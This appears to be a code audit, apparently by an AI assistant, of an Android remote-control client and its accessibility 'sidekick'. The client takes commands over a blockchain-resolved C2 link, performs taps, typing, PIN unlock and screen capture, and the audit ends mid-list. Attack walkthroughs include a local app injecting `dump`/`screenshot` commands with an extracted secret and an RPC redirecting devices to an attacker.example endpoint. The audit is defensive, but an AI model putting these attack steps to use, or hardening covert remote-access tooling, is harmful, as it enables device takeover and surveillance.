The secret is also a compile-time constant in both APKs. A partial update (main app updated, bundled sidekick update fails, or vice versa) can leave the two sides with different secrets. The auth then fails permanently until the sidekick is updated; the client retries every 60 s but cannot recover.

**Realistic failure sequence**

1. An attacker obtains the main APK (public distribution, backup, or a repackaged copy) and extracts the static secret.
2. The attacker app opens a TCP connection to `127.0.0.1:7777`, sends `{"auth":"<redacted-local-link-secret>"}`, then sends `{"cmd":"dump"}` or `{"cmd":"screenshot"}`.
3. The sidekick executes the command through the accessibility service.
4. The attacker can also send `{"cmd":"ping"}` periodically. `LocalLinkServer.handle()` calls `noteAlive()` on every command, so the attacker can keep `lastAliveMs` fresh and suppress the sidekick's babysitter even while real ghostd is dead.

Separate failure mode: after a main-app update that rotates the secret but fails to install the matching sidekick, `SidekickLink.connectLocked()` receives `ok:false`, throws “sidekick rejected auth,” and every subsequent command fails. The auto-arm timer keeps retrying with the wrong secret.

**Smallest recommended fix**

- Robust fix: replace TCP + shared secret with `LocalSocket`/`LocalServerSocket` on an abstract or private filesystem name, and verify `peerCred.uid` against the expected main-app UID (and optionally the package signature). This removes the static shared secret and the desync problem.
- If the transport cannot change yet: generate a per-install random secret, store it in the sidekick's private storage/Keystore, and expose it to the main app through a signature-protected provider. Do not commit a shared literal.
- Until then, treat the current secret as compromised and keep it stable across releases to avoid desync.

---

### 3. `LocalLinkServer.start()`/`stop()` can leave the listener dead or leak port 7777

**Severity:** High — proven.
**File/function:** `client-sidekick/app/src/main/java/com/tg/ghosta/LocalLinkServer.kt` → `start()` (lines 39–60), `stop()` (lines 62–69).

**Why it is a defect**

`start()` sets `running = true` before the `ServerSocket` is bound:

```kotlin
fun start() {
    if (running) return
    running = true
    Thread({
        try {
            val ss = ServerSocket(PORT, 8, InetAddress.getByName("127.0.0.1"))
            server = ss
            ...
        } catch (_: Exception) {
            // port taken or socket closed — service restart rebinds anyway
        } finally {
            server = null
        }
    }, "ghosta-link-accept").start()
}
```

If the bind fails (port squatted by another app, stale instance, TIME_WAIT, or a quick stop/start race), the catch swallows the exception and the thread exits, but `running` remains `true`. A later `start()` on the same instance returns immediately at `if (running) return`, so the local link never recovers.

There is a second race: `stop()` reads `server` from another thread, but `server` is a plain `var` (not `@Volatile`). If `stop()` runs before the accept thread assigns `server`, it sees `null`, does not close the listening socket, sets `running = false`, and the accept thread then binds, sees `running == false`, exits via `finally`, and sets `server = null` **without closing `ss`**. Port 7777 remains bound.

**Realistic failure sequence**

1. The user toggles the accessibility service off/on quickly, or another app is holding 7777.
2. The old instance's `stop()` closes the old listener. The new instance's `start()` races and gets a `BindException` (or TIME_WAIT).
3. `running` stays `true`; the new accept thread is dead; `onServiceConnected` will not call `start()` again.
4. The local link is dead for the life of the service instance. Ghostd's `tap`/`type`/`arm` commands fail; the sidekick cannot be re-armed; only a full sidekick process restart fixes it.
5. In the `stop()`-before-bind race, the listening socket leaks and blocks the next instance from binding, making recovery harder.

**Smallest recommended fix**

- Keep `running = true` before starting the thread (to handle stop-before-bind), but in the accept thread:
  - after bind, check `if (!running) { ss.close(); return }`;
  - in `finally`, close `ss`/`server`, set `server = null`, and set `running = false`;
  - log bind/accept failures instead of swallowing them.
- Make `server` `@Volatile` (or synchronize `start`/`stop`); consider retrying bind once after a short delay on `BindException`.
- If possible, avoid the fixed port entirely (or negotiate it); the current fixed 7777 is easy to squat.

---

### 4. Unbounded pre-auth connections: no auth timeout, thread-per-connection DoS

**Severity:** High — proven.
**File/function:** `client-sidekick/app/src/main/java/com/tg/ghosta/LocalLinkServer.kt` → `handle()` (lines 71–112), `start()` (lines 39–60).

**Why it is a defect**

`handle()` reads the auth line before setting any read timeout:

```kotlin
val authLine = input.readLine() ?: return
```

`start()` spawns a new thread for every accepted socket, with no concurrent-connection limit. The `ServerSocket` backlog of 8 limits pending connections, not accepted connections. An attacker does not need the secret to hold a connection open before auth.

**Realistic failure sequence**

1. A malicious app (any app with `INTERNET` permission; loopback is reachable) opens many connections to `127.0.0.1:7777` and sends nothing.
2. Each connection is accepted and spawns a `ghosta-link` thread that blocks forever in `readLine()`.
3. Thread/memory resources are exhausted; ghostd can no longer connect/auth; the local link is unavailable.
4. Since `noteAlive()` is not refreshed, the babysitter eventually kicks ghostd, but the sidekick's own resource exhaustion remains until the sidekick process is killed.

**Smallest recommended fix**

- Set `client.soTimeout = 5_000` before the auth `readLine()`; close on timeout. After successful auth, either clear it (0) or set a long idle timeout and require the client's 60 s ping (see finding 7).
- Add a small concurrent-connection cap (e.g., `AtomicInteger`, reject above 4) and always decrement in `finally`.
- Cap the auth line length / use a bounded reader; do not parse an unbounded line. If the JSON parser is recursive, also guard against `StackOverflowError` (the current `catch (Exception)` will not catch `Error`).

---

### 5. `stop()` does not close active client sockets; handler threads leak and can process one command after stop

**Severity:** High — proven.
**File/function:** `client-sidekick/app/src/main/java/com/tg/ghosta/LocalLinkServer.kt` → `stop()` (lines 62–69), `handle()` (lines 71–112).

**Why it is a defect**

`stop()` closes only the listening `ServerSocket`. It does not close accepted client sockets, and `handle()` has no `soTimeout`. The handler thread blocks in `input.readLine()` indefinitely. The loop is:

```kotlin
while (running) {
    val line = input.readLine() ?: break
    ...
    val response = CommandRouter.handle(line, driver)
    ...
}
```

If `stop()` runs while the thread is blocked inside `readLine()`, the thread remains blocked. When a command eventually arrives, the body executes once before the loop condition is re-checked, even though `running` is now false. So a command can be executed after the service is being torn down.

**Realistic failure sequence**

1. The user disables the accessibility service while ghostd is connected but idle.
2. `onDestroy` calls `link?.stop()`; the listener closes, but the accepted client socket remains open and the handler thread stays blocked.
3. The handler thread/socket leak for the life of the process. If a command arrives from the still-connected ghostd, the old handler processes it before exiting, operating on a service that is supposed to be stopping.
4. If the service is re-enabled without a process restart, the old handler and the new server can coexist; ghostd's old socket may be served by the stale handler.

**Smallest recommended fix**

- Track accepted sockets in a synchronized set; `stop()` closes all of them (or close a single `@Volatile var client` if only one legitimate client is expected).
- After `readLine()`, check `if (!running) break` before processing the command.
- Set a finite `soTimeout` for authenticated idle connections (e.g., 2 minutes) so handlers wake up and observe `running`; with the client pinging every 60 s, idle cleanup is safe.

---

### 6. `SidekickLink.send()` retries after writing; non-idempotent commands can execute twice

**Severity:** High — proven.
**File/function:** `client-main/app/src/main/java/com/tg/ghostd/SidekickLink.kt` → `send()` (lines 54–80).

**Why it is a defect**

The retry loop reconnects and resends after **any** exception, including a read timeout after the request was already written:

```kotlin
o.write(request.toString() + "\n")
o.flush()
response = i.readLine() ?: throw Exception("sidekick closed the link")
...
} catch (e: Exception) {
    closeLocked()
    if (attempt == 1) throw ...
}
```

The protocol has no request IDs and the sidekick has no dedupe. `tap`, `type`, `swipe`, `key`, `unlock`, and `install`-adjacent commands are not idempotent. The read timeout is 10 s (`READ_TIMEOUT_MS`); the sidekick's own `screenshot` has an 8 s internal budget, so the margin is small on a slow device/OEM. A lost response alone is enough to trigger the duplicate.

**Realistic failure sequence**

1. Ghostd sends `{"cmd":"tap","x":...,"y":...}` (or `type`/`swipe`/`key`).
2. The sidekick executes it, but the response is delayed past 10 s (slow accessibility service, device under load, or the response is lost).
3. Client `readLine()` throws `SocketTimeoutException`; `closeLocked()` closes the socket; attempt 1 reconnects and resends the same command.
4. The sidekick executes the tap/type/swipe twice. For an install/confirmation flow this can double-tap a consent button or duplicate text.

**Smallest recommended fix**

- Track whether the request was written: set `var sent = false`; after `o.flush()` set `sent = true`. In the catch, if `sent` is true, throw immediately instead of retrying. Only retry failures that happen during `connectLocked()` / before the write.
- Alternatively, add a request ID and have the sidekick dedupe; that is a larger protocol change.
- If keeping a retry for idempotent commands (`ping`, `arm`), make it explicit per command.

---

### 7. Local liveness beacon is tied to the C2 heartbeat; a C2 outage makes the babysitter force-restart healthy ghostd

**Severity:** High — proven (operational).
**Files/functions:**
- `client-main/app/src/main/java/com/tg/ghostd/SidekickLink.kt` → `startAutoArm()` (lines 88–107)
- `client-sidekick/app/src/main/java/com/tg/ghosta/LocalLinkServer.kt` → `lastAliveMs`/`noteAlive()` (lines 28–33), `handle()` (lines 93, 99)

**Why it is a defect**

The local link is actively pinged only by the C2 heartbeat: `GhostService.startHeartbeat()` sends `{"cmd":"ping"}` to the sidekick every 45 s (`HEARTBEAT_MS = 45_000L`). That call is stopped when the C2 WebSocket disconnects. The auto-arm timer, which is supposed to maintain the local link while the C2 is down, calls only:

```kotlin
ensureConnected()
```

`ensureConnected()` returns `true` if `aliveLocked()` is true and sends nothing. Therefore, during a C2 outage, `LocalLinkServer.noteAlive()` is not called, `lastAliveMs` goes stale, and the sidekick's babysitter treats ghostd as dead.

Call-site context: the babysitter checks every 5 minutes and considers the link stale after 15 minutes (`BABYSIT_CHECK_MS = 5 * 60_000`, `BABYSIT_STALE_MS = 15 * 60_000`). `KickReceiver` then starts `GhostService` with `force=true`, which interrupts the existing worker and tears down the heartbeat, then starts a fresh C2 loop.

**Realistic failure sequence**

1. The device loses the C2 server (airplane mode, server outage, network that blocks the C2 port) for more than 15 minutes.
2. The C2 heartbeat stops; the auto-arm timer calls `ensureConnected()` every 60 s but sends nothing.
3. `lastAliveMs` becomes older than 15 minutes; the babysitter sends `KICK`.
4. `KickReceiver` force-starts `GhostService`, interrupting a perfectly healthy C2 reconnect worker and restarting it. If the C2 is still unreachable, the cycle repeats every 15–20 minutes.
5. Side effects: repeated worker churn, interrupted local operations (file transfers/projection work in progress), and noisy logs/battery use.

**Smallest recommended fix**

- In the auto-arm timer task, send a lightweight request instead of just `ensureConnected()`:

```kotlin
override fun run() {
    try { send(JSONObject().put("cmd", "ping")) } catch (_: Exception) {}
}
```

`CommandRouter` already supports `ping` (returns `{"ok":true,"pong":true}`), and `LocalLinkServer.handle()` calls `noteAlive()` before routing it. This refreshes the beacon and detects a half-open link; `send()` reconnects on failure, and the existing `onConnected` hook re-sends `arm`.
- Also reset `LocalLinkServer.lastAliveMs = 0L` in `start()` so a new server instance does not inherit a stale “alive” timestamp from the previous instance.
- If a `disarm` command must persist, use `ping` in the timer (not `arm`); keep `arm` on the reconnect hook.

---

### 8. `allowBackup=true` plus plaintext device token; PIN blob backup/stale-keystore lifecycle

> **Status 2026-10-26:** partially resolved. The manifest now sets
> `allowBackup="false"` and the device token is encrypted with Android
> Keystore. The PIN lifecycle portion (`hasPin`/`pin`/`clearPin`/`setPin`) still
> matches this report and remains open.

**Severity:** High — proven configuration; impact depends on whether device backup is enabled.
**Files/functions:**
- `client-main/app/src/main/java/com/tg/ghostd/Prefs.kt` → `deviceToken()`/`setDeviceToken()`/`clearDeviceToken()` (lines 44–53), `setPin()`/`pin()`/`hasPin()`/`clearPin()` (lines 68–101)
- Supporting evidence: `client-main/app/src/main/AndroidManifest.xml` line 47 → `android:allowBackup="true"`

**Why it is a defect**

`Prefs` stores the device bearer token and the encrypted PIN blob in the default `ghostd.xml` SharedPreferences file. With `allowBackup="true"`, that file is eligible for Android auto-backup. The token is stored in plaintext; the `device_id` is also in the same file. The PIN blob is encrypted with a Keystore key that is device-bound and is **not** backed up.

Consequences:

- Backup/restore of `ghostd.xml` exposes the device token and device ID. An attacker with the backup can authenticate as the device (subject to server-side approval state) or correlate the device identity.
- On restore to a new device, the encrypted PIN blob exists but the Keystore key does not. `hasPin()` only checks for the blob, so it returns `true`; `pin()` returns `null`; `AppUpdater.ensureUnlocked()` thinks a PIN is available, calls `unlockWithStoredPin`, fails, and the unattended update requires manual unlock.
- `clearPin()` removes only the blob, not the Keystore key. If an old backup contains the blob and the device still has the key (or the key is restored), the old PIN remains decryptable.

**Realistic failure sequence**

1. Device has backup enabled; Android backs up `ghostd.xml`.
2. An attacker obtains the backup (cloud account compromise, forensic image) and reads `device_token`/`device_id`.
3. Separately, the user restores the app to a new device. `hasPin` is true, `pin` fails, and every update stalls on the lock screen.
4. Or, the user runs `unlock --forget`; the blob is removed but the Keystore key remains, so an old backed-up blob can still be decrypted on that device.

**Smallest recommended fix**

- Immediate: set `android:allowBackup="false"` or add `dataExtractionRules`/`fullBackupContent` excluding `ghostd.xml`. This is the smallest change that stops the token/PIN blob from leaving the device.
- Encrypt the device token with the same Keystore mechanism (or `EncryptedSharedPreferences`); do not store a bearer credential in plaintext.
- Make `pin()` self-healing: on any decryption failure, remove `KEY_PIN` (so `hasPin` becomes false) or make `hasPin()` verify decryption.
- Make `clearPin()` delete the Keystore entry (`KeyStore...deleteEntry(PIN_ALIAS)`) so old blobs cannot be decrypted with a retained key.
- `setPin()` currently swallows all exceptions; return a Boolean and report failure so the caller does not claim the PIN was stored when it was not.

---

## Medium

### 9. Endpoint cache is “last chain read,” not “last good connection”; no TTL; token not bound to endpoint

**Severity:** Medium — proven.
**Files/functions:**
- `client-main/app/src/main/java/com/tg/ghostd/EndpointResolver.kt` → `fetchFresh()` (lines 35–56), `writeCache` call (line 46), `forContext()` (lines 103–110)
- `client-main/app/src/main/java/com/tg/ghostd/Prefs.kt` → `cachedEndpoint()`/`setCachedEndpoint()` (lines 38–42), `deviceToken()` (lines 45–49)

**Why it is a defect**

The class comment says “Last-good endpoint is cached,” but `fetchFresh()` writes the cache immediately after a successful **chain read**, before any connection attempt:

```kotlin
val normalized = normalize(ep)
writeCache(normalized)
return normalized
```

If the contract/RPC returns a bad or unreachable endpoint (temporary owner mistake, malicious RPC, or a just-decommissioned server), the cache is overwritten and the previously working endpoint is lost. Later, when all RPCs fail, `resolve()` falls back to that never-proven endpoint.

There is also no timestamp/TTL. If the RPCs remain blocked, the app keeps using the old cached endpoint indefinitely. A decommissioned IP can be reassigned; the client then connects to a different party and sends the static enroll key and old device token.

The device token is global, not scoped to the endpoint. If the endpoint changes, `registerMessage()` still sends the old token (and enroll key) to the new server.

**Realistic failure sequence**

1. The owner temporarily points the contract at a wrong/unreachable endpoint, or an RPC returns one.
2. `fetchFresh()` writes it to `endpoint_cache`; the connection fails.
3. Later, the RPCs are blocked (e.g., on a network that blocks Polygon RPCs). `resolve()` returns the bad cached endpoint, not the previous working one.
4. The device stays offline until the RPCs work again or the cache is manually cleared.
5. If the endpoint has changed to a new server, the old token is sent to it; if the new server is attacker-controlled, the token is exposed.

**Smallest recommended fix**

- Move the cache write out of `fetchFresh()` and into the successful-connect path (`connectedOk` in `GhostService.runLoop`), or add an `EndpointResolver.markConnected(endpoint)` method. Cache only an endpoint that actually worked.
- Add `endpoint_cache_ts` and expire the cache after a reasonable TTL (e.g., 7 days). On expiry, return `null` so the chain is re-read rather than silently using a stale endpoint.
- In `Prefs.setCachedEndpoint()`, compare the old and new endpoint; if the host changed, clear the device token (`clearDeviceToken`) or store the token with the endpoint and return it only on a match.

---

### 10. `resolve()` keeps the C2 reconnect on the critical path for up to ~80 s

**Severity:** Medium — proven.
**Files/functions:** `client-main/app/src/main/java/com/tg/ghostd/EndpointResolver.kt` → `resolve()` (line 29), `fetchFresh()` (35–56), `httpPost()` (70–92).

**Why it is a defect**

`resolve()` is `fetchFresh() ?: readCache()`. `fetchFresh()` tries all four RPCs before the cache is consulted. Each `httpPost()` has:

```kotlin
conn.connectTimeout = 10_000
conn.readTimeout = 10_000
```

Worst case: 4 × (10 s connect + 10 s read) ≈ **80 s** before the cached endpoint is used. `GhostService.runLoop()` calls `resolve()` before every connection attempt. On a network that blocks/throttles Polygon RPCs but still allows the C2, every reconnect is delayed by up to 80 s even though a good cached endpoint is available.

`connectTimeout` also does not bound DNS resolution in the underlying `HttpURLConnection`; a black-holed DNS can extend the stall beyond 80 s.

**Realistic failure sequence**

1. The C2 connection drops transiently (Wi-Fi handoff, server restart).
2. The device is on a network that blocks or rate-limits the four RPC hosts.
3. `resolve()` tries RPC 1 (20 s timeout), RPC 2 (20 s), RPC 3 (20 s), RPC 4 (20 s), then finally returns the cache.
4. The device stays offline for ~80 s per reconnect instead of reconnecting in a few seconds.

**Smallest recommended fix**

- For reconnects, use the cached endpoint immediately and refresh the chain value in the background (or only every N minutes / after a failed connection). The endpoint rarely changes; the cache is already the intended fallback.
- If fresh-first is required, add an overall deadline (e.g., 15 s) and use the cache when it expires, or reduce per-RPC timeouts to ~3–4 s.
- An overall deadline via `Future.get(timeout)` / OkHttp `callTimeout` also covers DNS, which `connectTimeout` does not.

---

### 11. Single-RPC trust: the first successful RPC can redirect the whole fleet

**Severity:** Medium — design/conditional (requires a compromised or malicious RPC provider).
**File/function:** `client-main/app/src/main/java/com/tg/ghostd/EndpointResolver.kt` → `fetchFresh()` (lines 35–56).

**Why it is a defect**

The loop returns the first non-empty decoded endpoint and writes it to the cache. There is no quorum, no cross-check, and no storage proof. The four RPCs are independent public providers; one compromised/misbehaving provider can return an attacker-controlled endpoint. The client will connect to it and send the static enroll key and device token.

Even with `wss://`, the attacker can obtain a valid certificate for their endpoint; the client does not pin the server certificate/key.

**Realistic failure sequence**

1. One public RPC (or a MITM on that HTTPS connection, if the device trusts an attacker CA) returns a crafted `eth_call` result with `ws://attacker.example:8443`.
2. `fetchFresh()` accepts it, writes the cache, and returns it.
3. The client connects to the attacker, sends `hello` with the enroll key and token, and the attacker captures them or feeds fake commands/results.

**Smallest recommended fix**

- Require at least two independent RPCs to return the same normalized endpoint before accepting/updating the cache. If they disagree, keep the last-good cached endpoint and log/retry. This is a small logic change and raises the bar significantly.
- Long term: verify a contract storage proof or pin the endpoint’s TLS certificate/public key.

---

### 12. `HelloAck.parse` coerces JSON `null` token to `"null"`; status is not trimmed/validated

> **Status 2026-10-26:** still open. Current `HelloAck.parse` remains
> vulnerable to the `"null"` sentinel and should be validated as described.

**Severity:** Medium — proven parser behavior; current server normally sends only the three known statuses.
**File/function:** `client-main/app/src/main/java/com/tg/ghostd/HelloAck.kt` → `parse()` (lines 32–40).

**Why it is a defect**

```kotlin
return HelloAck(msg.optString("status"), msg.optString("token").ifEmpty { null })
```

Android's `org.json` coerces the sentinel `JSONObject.NULL` to the string `"null"` in `optString()`. Therefore:

```json
{"type":"hello_ack","status":"approved","token":null}
```

produces `HelloAck(status="approved", token="null")`. The token is non-empty, so the client stores the literal string `"null"` as the device token. On the next hello it sends `"token":"null"`; the server treats it as a bad token, falls back to the enroll key, and returns `pending` with a new token. The client may enter a pending/re-enrollment state even though the server still considers the device approved.

`status` is not trimmed or validated. `{"status":"Approved"}` or `{"status":" approved"}` is treated as unknown. `GhostService.handleHelloAck()` has an `else` branch that keeps the session open for unknown statuses without storing a token and without backoff. That can leave a permanently unauthenticated session that looks connected.

**Realistic failure sequence**

1. A server/proxy bug or a MITM on the plaintext C2 sends `"token":null` (or a status with different capitalization/whitespace).
2. `HelloAck.parse` returns a token of `"null"` (or an unknown status).
3. The client stores `"null"` and sends it on the next hello; the server returns `pending` with a new token. The operator may see the device flip to pending, or the session stays open without a valid token.
4. For unknown status, the client keeps the socket open and never backs off, so the condition persists across reconnects.

**Smallest recommended fix**

```kotlin
val status = msg.optString("status").trim().lowercase()
if (status !in setOf(STATUS_APPROVED, STATUS_PENDING, STATUS_DENIED)) return null
val token = if (msg.isNull("token")) null
            else msg.optString("token").takeIf { it.isNotBlank() }
return HelloAck(status, token)
```

Add a unit test for `"token":null`. If returning `null` for unknown status would route the message to `CommandHandler`, alternatively treat unknown status as `denied` in the caller so it clears the token and backs off.

---

### 13. PIN lifecycle: stale blob after restore, `clearPin` keeps the key, `setPin` fails silently

**Severity:** Medium — proven.
**File/function:** `client-main/app/src/main/java/com/tg/ghostd/Prefs.kt` → `setPin()` (68–79), `pin()` (81–95), `hasPin()` (97), `clearPin()` (99–101), `pinKey()` (103–121).

**Why it is a defect**

- `hasPin()` is only a presence check:
  ```kotlin
  fun hasPin(ctx: Context): Boolean = sp(ctx).getString(KEY_PIN, null) != null
  ```
  If the blob exists but the Keystore key is gone (backup restore/factory reset/keystore reset) or the blob is corrupt, `hasPin()` still returns `true`. `AppUpdater.ensureUnlocked()` uses `hasPin()` as its precondition, then `unlockWithStoredPin()` calls `pin()`, which returns `null`; the update requires manual unlock with no self-healing.
- `clearPin()` removes only the SharedPreferences entry. The Keystore key (`PIN_ALIAS`) remains. An old backed-up blob can still be decrypted if the key is present.
- `setPin()` catches and ignores every exception. If Keystore generation fails, the PIN is not stored, but the caller may report success; `hasPin()` remains false. This is non-fatal by design but silently degrades unattended updates.

**Realistic failure sequence**

1. User backs up/restores app data to a new device (or the Keystore key is invalidated).
2. `hasPin` returns true; `pin` returns null; the update path believes it can unlock but cannot.
3. Alternatively, the user runs `unlock --forget`: the blob is removed but the key remains, so an old backup blob is still decryptable on that device.

**Smallest recommended fix**

- In `pin()`, on any exception, call `clearPin(ctx)` (self-heal) so `hasPin` becomes false after the first failed decrypt. Optionally make `hasPin()` call `pin() != null`, but that doubles Keystore crypto in `AppUpdater`.
- In `clearPin()`, delete the Keystore entry:
  ```kotlin
  KeyStore.getInstance("AndroidKeyStore").apply { load(null) }.deleteEntry(PIN_ALIAS)
  ```
- Make `setPin()` return `Boolean` and have the caller report failure; do not silently claim the PIN was stored.
- Combine with the backup exclusion from finding 8.

---

### 14. Unsynchronized `deviceId` can generate two IDs under concurrency

**Severity:** Low/Medium — proven concurrency bug; requires two callers at the same moment.
**File/function:** `client-main/app/src/main/java/com/tg/ghostd/Prefs.kt` → `deviceId()` (lines 31–36).

**Why it is a defect**

```kotlin
fun deviceId(ctx: Context): String {
    sp(ctx).getString(KEY_DEVICE_ID, null)?.let { return it }
    val id = UUID.randomUUID().toString()
    sp(ctx).edit().putString(KEY_DEVICE_ID, id).apply()
    return id
}
```

There is no synchronization. Two callers can both see no stored ID, generate different UUIDs, and `apply()` them; one caller returns an ID that is not persisted. The call sites are `GhostService.registerMessage()` (C2 WebSocket thread) and `DataReaders` (command thread). A `device_id` command concurrent with a reconnect hello can trigger this.

**Realistic failure sequence**

1. Ghostd reconnects and calls `registerMessage()` on the WebSocket thread.
2. A command calls `DataReaders.device_id` on the command thread at the same time.
3. Both see no ID, generate different UUIDs; one is persisted, the other is returned to its caller.
4. The server sees two device IDs for one physical device: one may be approved, the other pending. The next reconnect uses whichever ID won the `apply()`, causing a device identity flip or a duplicate pending entry.

**Smallest recommended fix**

```kotlin
@Synchronized fun deviceId(ctx: Context): String { ... }
```

or wrap the get/generate/put in `synchronized(this)`. This is a one-line fix.

---

## Lower-severity and hardening notes

### 15. `BootReceiver` has no exception handling; setup flag uses `apply()`

**File/function:** `client-main/app/src/main/java/com/tg/ghostd/BootReceiver.kt` → `onReceive()` (lines 8–21); `Prefs.setSetupDone()` (lines 26–28).

- `startForegroundService()` is called without a try/catch. On AOSP Android 12+, `BOOT_COMPLETED` and `MY_PACKAGE_REPLACED` are exemptions from the foreground-service background-start restriction, so this usually works. OEM battery managers (Xiaomi/Huawei/Oppo/etc.) may still throw `ForegroundServiceStartNotAllowedException`/`IllegalStateException`; the receiver would crash and the service would not start. `KickReceiver` already catches this; `BootReceiver` should too. **Fix:** wrap in `try/catch (Exception)` and log.
- `setSetupDone()` uses `apply()` (asynchronous). If setup completes and the process is killed/rebooted before the disk write, `setupDone` is false at boot and the receiver skips the service. **Fix:** use `commit()` for this one-time flag.
- **Proven vs speculative:** the lack of try/catch and the async write are proven code facts; the OEM crash is speculative/OEM-dependent.

### 16. `https://1rpc.io/matic` returns HTTP 403; static RPC list

**File:** `client-main/app/src/main/java/com/tg/ghostd/C2Config.kt` → `RPC_URLS` (lines 16–21).

In this environment, `eth_blockNumber` to `https://1rpc.io/matic` returned HTTP 403 with both the default user agent and `ghostctl/0.2`; the other three returned HTTP 200. The app treats the 403 as a failed RPC and moves on, so it is a wasted fallback. If the first three are blocked/rate-limited in the target region, the fourth is not viable. **Fix:** replace it with a verified public RPC (e.g., `https://polygon-rpc.com`, `https://polygon.llamarpc.com`) and log which RPC succeeded/failed. **Caveat:** the 403 may be environmental/geo/rate-limit-specific; verify in the target regions.

### 17. `startAutoArm()` on an already-connected link never re-arms

**File/function:** `client-main/app/src/main/java/com/tg/ghostd/SidekickLink.kt` → `startAutoArm()` (lines 88–107).

`startAutoArm()` calls `stopAutoArm()` (which sets `onConnected = null`), installs a new hook, and starts the timer. If the socket is already alive, no new connection occurs, so the new `onConnected` hook never fires; the timer’s `ensureConnected()` returns `true` without sending `arm`. The common path is safe because `GhostService.onDestroy()` calls `close()`, but a service re-creation without `onDestroy` (OEM behavior) or a future caller can hit it. **Fix:** if `aliveLocked()` is true when `startAutoArm()` is called, send `arm` once (or set a flag for the first timer tick). The timer’s periodic `ping` from finding 7 does not re-arm by itself.

### 18. `close()` / `isConnected()` can block behind a 10–20 s `send()`

**File/function:** `client-main/app/src/main/java/com/tg/ghostd/SidekickLink.kt` → `close()` (122–124), `isConnected()` (48), `send()` (54–80), `connectLocked()` (129–165).

`send()` holds `lock` for the entire connect/write/read sequence. `CONNECT_TIMEOUT_MS` and `READ_TIMEOUT_MS` are both 10 s, so a failed send can hold the lock for up to ~20 s. `GhostService.onDestroy()` calls `SidekickLink.close()` on the main thread; if an in-flight heartbeat `send(ping)` holds the lock, the main thread blocks and can ANR. `isConnected()` has the same lock behavior (no current call sites found, but the public API is hazardous). **Fix:** make lifecycle operations best-effort (close the socket without waiting, or use a `ReentrantLock` with `tryLock(1 s)`); reduce the connect/read timeouts; or track/join the heartbeat beacon thread.

### Additional hardening (small, no refactor)

- **Constant-time auth compare:** `LocalLinkServer.handle()` uses `?.get("auth") == SECRET`. Over loopback, timing is noisy, but use `MessageDigest.isEqual(auth.toByteArray(), SECRET.toByteArray())` as cheap hardening. The static-secret issue (finding 2) is the real problem.
- **Auth line length / `Throwable`:** `handle()` uses `input.readLine()` with no length bound and `catch (_: Exception)`. A malicious pre-auth client can send a very large or deeply nested line. Cap the line length / use a bounded reader; if the parser is recursive, catch `StackOverflowError` or ensure the parser is iterative. `catch (Exception)` does not catch `Error`.
- **`server` visibility:** make `LocalLinkServer.server` `@Volatile` and/or synchronize `start`/`stop`; it is written by the accept thread and read by `stop()`.
- **Bind failure logging:** `LocalLinkServer.start()` silently swallows bind/accept exceptions. Log them; otherwise a dead local link is invisible in the field.
- **Scheme casing / URI validation:** `EndpointResolver.normalize()` is case-sensitive (`startsWith("ws://")`). `WSS://` or `HTTP://` becomes a malformed `ws://WSS://...`. Trim/lowercase the scheme and validate that the normalized URI has a host. Low.
- **Critical token writes:** `Prefs.setDeviceToken`/`clearDeviceToken` use `apply()`. If the process is killed immediately after a hello_ack, the token write may be lost. `commit()` for the token is a small reliability improvement.
- **Endpoint RPC health:** `C2Config.RPC_URLS` is static. A startup health check/log would make the 403/dead-RPC situation visible; a bootstrap endpoint or manual-endpoint setup would cover first install on a network that blocks all RPCs, but that is a product decision.

---

## Speculative / OEM concerns (not proven code defects)

These are real field risks but depend on OEM behavior, network, or deployment; they should not be treated as definite bugs in the listed files.

1. **OEM boot-time foreground-service blocks.** AOSP Android 12+ exempts `BOOT_COMPLETED`/`MY_PACKAGE_REPLACED` from the FGS background-start restriction, so `BootReceiver` usually works. Some OEM battery managers may still block or delay it. The `try/catch` in note 15 is the correct mitigation; a WorkManager fallback would be a new feature.
2. **Accessibility service rebind after reboot.** Some OEMs do not rebind accessibility services automatically after reboot, or they disable them after a force-stop. The sidekick's `LocalLinkServer` may not start; ghostd's auto-arm timer retries every 60 s, but there is no user-visible alert if the sidekick remains disabled. The main app cannot enable accessibility without user action. This is an OEM/product concern, not a defect in `LocalLinkServer.kt`.
3. **RPC geo-blocking/rate limits and DNS.** The `1rpc.io` 403 observed here may be environment-specific. `HttpURLConnection` DNS resolution is not bounded by `connectTimeout`; behavior varies by network/OEM. An overall deadline is the robust fix (finding 10).
4. **Android backup/Keystore behavior.** `allowBackup=true` is the enabler; whether a particular device actually backs up, and how Keystore keys behave across restore/OEM updates, varies. The mitigation (disable/exclude backup, self-heal the PIN blob, delete the key on clear) is still correct.
5. **Local-link threat model.** Binding to `127.0.0.1` is sound against remote attackers. The risk is a malicious app on the same device with `INTERNET` permission, plus APK extraction of the static secret. This is not an OEM issue; it is a design/threat-model issue captured in finding 2.

---

## What is sound (so it is not “fixed” unnecessarily)

- `LocalLinkServer` binds only to `127.0.0.1` and does not expose the sidekick to the network.
- `EndpointResolver` uses HTTPS for the RPC calls.
- The server-side hello authentication uses `hmac.compare_digest` for the enroll key/token (outside scope, but relevant).
- The PIN is encrypted with AES/GCM and a key that stays in the Android Keystore; the design is sound, but the lifecycle/backup handling needs the fixes above.
- While the C2 WebSocket is connected, `GhostService.startHeartbeat()` pings the sidekick every 45 s; that keeps the local link and `lastAliveMs` fresh. The gap is only when the C2 heartbeat is stopped (finding 7).
- `CommandRouter` already supports `ping`, so the liveness fix is a one-line change on the client.

---

## Suggested priority order

1. **Fix the C2 transport** (finding 1) — without TLS, the enroll key/token are exposed regardless of other fixes.
2. **Remove the static local-link secret / add peer auth** (finding 2) — a local malicious app can drive accessibility and spoof liveness.
3. **Fix `LocalLinkServer` start/stop and socket cleanup** (findings 3–5) — these directly break the localhost link lifecycle.
4. **Stop the blind `send()` retry after write** (finding 6) — prevents duplicate taps/types/unlocks.
5. **Decouple the local beacon from the C2 heartbeat** (finding 7) — prevents unnecessary force-restarts during outages.
6. **Disable/exclude backup and self-heal the PIN/token storage** (findings 8, 13).
7. **Fix the endpoint cache semantics/TTL and reconnect blocking** (findings 9–10); then consider RPC quorum (11).
8. **Parser and concurrency hardening** (findings 12, 14, 15–18).

---


# MediaProjection consent / capture audit

No files edited. Findings below are from the current working tree. I mark device-dependent or unread assumptions explicitly.

## P0 — MediaProjection is still persistent (verified)

- `ProjectionHub.kt:12-24` documents “projection persists until stopped”; `ensureProjection()` returns the cached object at `ProjectionHub.kt:60`.
- `ScreenCapturer.shotInternal()` (`ScreenCapturer.kt:97-136`) and `runStream()` (`ScreenCapturer.kt:196-267`) release only `VirtualDisplay`/`ImageReader`; they never release the projection.
